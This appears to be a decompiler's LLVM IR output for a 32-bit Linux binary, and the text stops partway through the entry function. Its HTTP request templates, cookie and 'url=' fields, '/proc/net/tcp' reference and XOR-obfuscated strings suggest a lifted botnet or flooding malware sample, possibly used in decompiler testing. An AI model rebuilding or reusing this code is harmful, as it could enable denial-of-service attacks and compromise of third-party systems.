source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805300c.2 = global i32 0
@global_var_8053024.3 = local_unnamed_addr global i32* @global_var_805300c.2
@global_var_8052474.5 = constant [4 x i8] c"GET\00"
@global_var_805244d.6 = constant i32 1210056751
@global_var_805247f.7 = constant i32 540737568
@global_var_805244f.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8052467.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_8052486.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052478.11 = constant [9 x i8] c"Cookie: \00"
@global_var_8052481.12 = constant [3 x i8] c"; \00"
@global_var_8052484.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8052489.14 = constant i32 1952972859
@global_var_805248b.15 = constant [5 x i8] c"http\00"
@global_var_805249a.16 = constant i32 -1623588825
@global_var_8052490.17 = constant [5 x i8] c"url=\00"
@global_var_8052495.18 = constant [5 x i8] c"POST\00"
@global_var_8052493.19 = constant i32 1330643005
@global_var_80524b0.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_805310c.21 = local_unnamed_addr global i32 0
@global_var_8053108.22 = local_unnamed_addr global i32 0
@global_var_80530c4.23 = local_unnamed_addr global i32 0
@global_var_8053030.24 = local_unnamed_addr global i32 134543392
@global_var_8053028.25 = local_unnamed_addr global i32 -1
@global_var_8053104.27 = local_unnamed_addr global i32 0
@global_var_8053114.28 = local_unnamed_addr global i32 0
@global_var_8053112.29 = local_unnamed_addr global i32 0
@global_var_80530cc.30 = local_unnamed_addr global i32 0
@global_var_80530d8.31 = local_unnamed_addr global i32 0
@global_var_80530d0.32 = local_unnamed_addr global i32 0
@global_var_80530d4.33 = local_unnamed_addr global i32 0
@global_var_8053120.34 = global i32 0
@global_var_8052545.36 = constant i32 1326272261
@global_var_8053138.37 = local_unnamed_addr global i32 0
@global_var_805313c.38 = local_unnamed_addr global i32 0
@global_var_8052555.39 = constant [3 x i8] c"m?\00"
@global_var_8053140.40 = local_unnamed_addr global i32 0
@global_var_8053144.41 = local_unnamed_addr global i32 0
@global_var_80531b0.42 = local_unnamed_addr global i32 0
@global_var_80531b4.43 = local_unnamed_addr global i32 0
@global_var_8052558.44 = constant i32 234915801
@global_var_80531b8.45 = local_unnamed_addr global i32 0
@global_var_80531bc.46 = local_unnamed_addr global i32 0
@global_var_805255b.47 = constant i32 370215694
@global_var_8053130.48 = local_unnamed_addr global i32 0
@global_var_8053134.49 = local_unnamed_addr global i32 0
@global_var_80526e8.50 = constant i32 303437322
@global_var_8053148.51 = local_unnamed_addr global i32 0
@global_var_805314c.52 = local_unnamed_addr global i32 0
@global_var_8052566.53 = constant i32 219157069
@global_var_8053150.54 = local_unnamed_addr global i32 0
@global_var_8053154.55 = local_unnamed_addr global i32 0
@global_var_805256e.56 = constant i32 119146317
@global_var_8053158.57 = local_unnamed_addr global i32 0
@global_var_805315c.58 = local_unnamed_addr global i32 0
@global_var_8052574.59 = constant i32 235341386
@global_var_8053160.60 = local_unnamed_addr global i32 0
@global_var_8053164.61 = local_unnamed_addr global i32 0
@global_var_805257f.62 = constant i32 1644561485
@global_var_8053168.63 = local_unnamed_addr global i32 0
@global_var_805316c.64 = local_unnamed_addr global i32 0
@global_var_8052584.65 = constant i32 185336652
@global_var_8053170.66 = local_unnamed_addr global i32 0
@global_var_8053174.67 = local_unnamed_addr global i32 0
@global_var_805258c.68 = constant i32 51777869
@global_var_8053178.69 = local_unnamed_addr global i32 0
@global_var_805317c.70 = local_unnamed_addr global i32 0
@global_var_8052595.71 = constant i32 758261552
@global_var_8053180.72 = local_unnamed_addr global i32 0
@global_var_8053184.73 = local_unnamed_addr global i32 0
@global_var_80525a3.74 = constant [11 x i8] c"*662$.--&b\00"
@global_var_8053188.75 = local_unnamed_addr global i32 0
@global_var_805318c.76 = local_unnamed_addr global i32 0
@global_var_80525ae.77 = constant [11 x i8] c".-.,-%6$-b\00"
@global_var_8053190.78 = local_unnamed_addr global i32 0
@global_var_8053194.79 = local_unnamed_addr global i32 0
@global_var_80529d8.80 = constant i32 1515395646
@global_var_8053198.81 = local_unnamed_addr global i32 0
@global_var_805319c.82 = local_unnamed_addr global i32 0
@global_var_80525b9.83 = constant i32 235801880
@global_var_80531a0.84 = local_unnamed_addr global i32 0
@global_var_80531a4.85 = local_unnamed_addr global i32 0
@global_var_80525c2.86 = constant [12 x i8] c"%'6.-!#.+2b\00"
@global_var_80531a8.87 = local_unnamed_addr global i32 0
@global_var_80531ac.88 = local_unnamed_addr global i32 0
@global_var_80525ce.89 = constant i32 235342353
@global_var_80531c0.90 = local_unnamed_addr global i32 0
@global_var_80531c4.91 = local_unnamed_addr global i32 0
@global_var_8052706.92 = constant i32 199687
@global_var_80531c8.93 = local_unnamed_addr global i32 0
@global_var_80531cc.94 = local_unnamed_addr global i32 0
@global_var_80525d5.95 = constant i32 370219793
@global_var_80531d0.96 = local_unnamed_addr global i32 0
@global_var_80531d4.97 = local_unnamed_addr global i32 0
@global_var_80525dd.98 = constant i32 6425105
@global_var_80531d8.99 = local_unnamed_addr global i32 0
@global_var_80531dc.100 = local_unnamed_addr global i32 0
@global_var_805270e.101 = constant i32 202047565
@global_var_80531e0.102 = local_unnamed_addr global i32 0
@global_var_80531e4.103 = local_unnamed_addr global i32 0
@global_var_80525e1.104 = constant i32 590359343
@global_var_80531e8.105 = local_unnamed_addr global i32 0
@global_var_80531ec.106 = local_unnamed_addr global i32 0
@global_var_80525fa.107 = constant i32 269287692
@global_var_80531f0.108 = local_unnamed_addr global i32 0
@global_var_80531f4.109 = local_unnamed_addr global i32 0
@global_var_8052722.110 = constant i32 202047565
@global_var_80531f8.111 = local_unnamed_addr global i32 0
@global_var_80531fc.112 = local_unnamed_addr global i32 0
@global_var_8052733.113 = constant i32 202047565
@global_var_8053200.114 = local_unnamed_addr global i32 0
@global_var_8053204.115 = local_unnamed_addr global i32 0
@global_var_8052604.116 = constant i32 386740534
@global_var_8053208.117 = local_unnamed_addr global i32 0
@global_var_805320c.118 = local_unnamed_addr global i32 0
@global_var_805261a.119 = constant i32 18220877
@global_var_8053210.120 = local_unnamed_addr global i32 0
@global_var_8053214.121 = local_unnamed_addr global i32 0
@global_var_805262c.122 = constant i32 118424332
@global_var_8053218.123 = local_unnamed_addr global i32 0
@global_var_805321c.124 = local_unnamed_addr global i32 0
@global_var_8052639.125 = constant i32 202116385
@global_var_8053220.126 = local_unnamed_addr global i32 0
@global_var_8053224.127 = local_unnamed_addr global i32 0
@global_var_805274c.128 = constant i32 117506339
@global_var_8053228.129 = local_unnamed_addr global i32 0
@global_var_805322c.130 = local_unnamed_addr global i32 0
@global_var_80529fc.131 = constant i32 117506339
@global_var_8053230.132 = local_unnamed_addr global i32 0
@global_var_8053234.133 = local_unnamed_addr global i32 0
@global_var_8052a20.134 = constant i32 369888545
@global_var_8053238.135 = local_unnamed_addr global i32 0
@global_var_805323c.136 = local_unnamed_addr global i32 0
@global_var_8052651.137 = constant i32 555091729
@global_var_8053240.138 = local_unnamed_addr global i32 0
@global_var_8053244.139 = local_unnamed_addr global i32 0
@global_var_805265e.140 = constant i32 268699408
@global_var_8053248.141 = local_unnamed_addr global i32 0
@global_var_805324c.142 = local_unnamed_addr global i32 0
@global_var_8052668.143 = constant i32 50400526
@global_var_8053250.144 = local_unnamed_addr global i32 0
@global_var_8053254.145 = local_unnamed_addr global i32 0
@global_var_8052673.146 = constant i32 1326843665
@global_var_8053258.147 = local_unnamed_addr global i32 0
@global_var_805325c.148 = local_unnamed_addr global i32 0
@global_var_8052680.149 = constant i32 369888513
@global_var_8053260.150 = local_unnamed_addr global i32 0
@global_var_8053264.151 = local_unnamed_addr global i32 0
@global_var_8052691.152 = constant i32 201527318
@global_var_8053268.153 = local_unnamed_addr global i32 0
@global_var_805326c.154 = local_unnamed_addr global i32 0
@global_var_80526a5.155 = constant i32 202836481
@global_var_8053270.156 = local_unnamed_addr global i32 0
@global_var_8053274.157 = local_unnamed_addr global i32 0
@global_var_8052645.158 = constant i32 302450441
@global_var_8053278.159 = local_unnamed_addr global i32 0
@global_var_805327c.160 = local_unnamed_addr global i32 0
@global_var_80526ae.161 = constant i32 202116353
@global_var_8053280.162 = local_unnamed_addr global i32 0
@global_var_8053284.163 = local_unnamed_addr global i32 0
@global_var_80526bb.164 = constant i32 336594705
@global_var_8053288.165 = local_unnamed_addr global i32 0
@global_var_805328c.166 = local_unnamed_addr global i32 0
@global_var_80526ce.167 = constant i32 336594705
@global_var_8053290.168 = local_unnamed_addr global i32 0
@global_var_8053294.169 = local_unnamed_addr global i32 0
@global_var_80527a0.170 = constant i32 186125615
@global_var_8053298.171 = local_unnamed_addr global i32 0
@global_var_805329c.172 = local_unnamed_addr global i32 0
@global_var_8052810.173 = constant i32 186125615
@global_var_80532a0.174 = local_unnamed_addr global i32 0
@global_var_80532a4.175 = local_unnamed_addr global i32 0
@global_var_8052880.176 = constant i32 186125615
@global_var_80532a8.177 = local_unnamed_addr global i32 0
@global_var_80532ac.178 = local_unnamed_addr global i32 0
@global_var_80528f0.179 = constant i32 186125615
@global_var_80532b0.180 = local_unnamed_addr global i32 0
@global_var_80532b4.181 = local_unnamed_addr global i32 0
@global_var_8052960.182 = constant i32 186125615
@global_var_80532b8.183 = local_unnamed_addr global i32 0
@global_var_80532bc.184 = local_unnamed_addr global i32 0
@global_var_80530fc.185 = global i32 0
@global_var_80532c0.186 = global i32 0
@global_var_805303c.187 = global i32 0
@global_var_805336c.189 = global i32 0
@global_var_8053370.190 = local_unnamed_addr global i32 0
@global_var_8053374.191 = global i32 0
@global_var_8053380.192 = local_unnamed_addr global i32 0
@global_var_8053674.193 = global i32 0
@global_var_805369c.194 = local_unnamed_addr global i32 0
@global_var_805368c.195 = local_unnamed_addr global i32 0
@global_var_8053690.196 = local_unnamed_addr global i32 0
@global_var_8053694.197 = local_unnamed_addr global i32 0
@global_var_8053698.198 = local_unnamed_addr global i32 0
@global_var_80536a4.199 = local_unnamed_addr global i32 0
@global_var_80536b0.200 = local_unnamed_addr global i32 0
@global_var_80536a8.201 = local_unnamed_addr global i32 0
@global_var_80536b4.202 = local_unnamed_addr global i32 0
@global_var_8053688.203 = local_unnamed_addr global i32 0
@global_var_8053684.205 = local_unnamed_addr global i32 0
@global_var_80536ac.206 = local_unnamed_addr global i32 0
@global_var_805337c.207 = local_unnamed_addr global i32 0
@global_var_8053054.208 = global i32 0
@global_var_8052dc0.210 = constant i32 33554944
@global_var_8053088.211 = local_unnamed_addr global i32* @global_var_8052dc0.210
@global_var_805306c.212 = global i32 0
@global_var_80530e0.213 = local_unnamed_addr global i32 0
@global_var_8053000.215 = global i32 -1
@global_var_80519e9.216 = constant i32 -294069
@global_var_80530f0.217 = local_unnamed_addr global i32 0
@global_var_80530f4.218 = local_unnamed_addr global i32 0
@global_var_8052cac.219 = constant [10 x i8] c"/dev/null\00"
@global_var_80530ec.221 = local_unnamed_addr global i32 0
@global_var_80530e4.222 = local_unnamed_addr global i32 0
@global_var_80530e8.223 = local_unnamed_addr global i32 0
@global_var_8052488.224 = constant i32 1744845568
@global_var_8053084.225 = local_unnamed_addr global i32* @global_var_8052488.224
@global_var_8051bcf.226 = constant i32 1928542531
@global_var_8051bf3.227 = constant i32 1928542531
@global_var_8053100.228 = local_unnamed_addr global i32 0
@global_var_80536b8.229 = local_unnamed_addr global i32 0
@global_var_80536bc.230 = local_unnamed_addr global i32 0
@global_var_80530a0.1 = local_unnamed_addr global i8 0
@global_var_8053034.26 = local_unnamed_addr global i8 1
@global_var_8053038.35 = local_unnamed_addr global i16 -8531
@global_var_8053340.188 = global i8 0
@global_var_80536a0.204 = local_unnamed_addr global i8 0
@global_var_80530dc.209 = local_unnamed_addr global i8 0
@global_var_80530f8.220 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 44919
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_80523f0()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_80530a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8053024.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80530a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053024.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80530a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134557632)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134557712 to i32*), align 16
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* %ecx.global-to-local, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v11_8048180 = call i32 @function_8051a85(i32 134535600, i32 %v3_8048166, i32* nonnull %stack_var_4, i32 -108, i32 134554646, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134554646, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134554646, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8052474.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp135 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp135, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_805244d.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a4b0(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a4b0(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_80500da(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp237 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_804f5b0(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_804f5b0(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_804f5b0(i8* %tmp237)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5211 = call i32 @function_804f5b0(i8* %tmp237)
  store i32 %v2_80482a5211, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4212 = icmp eq i32 %v2_80482a5211, 0
  store i1 %v12_80482b4212, i1* %zf.global-to-local, align 1
  %v7_80482b6213 = icmp sgt i32 %v2_80482a5211, 0
  br i1 %v7_80482b6213, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0216 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be215 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8214 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp237, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be215, %v4_80482a0216
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be215, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
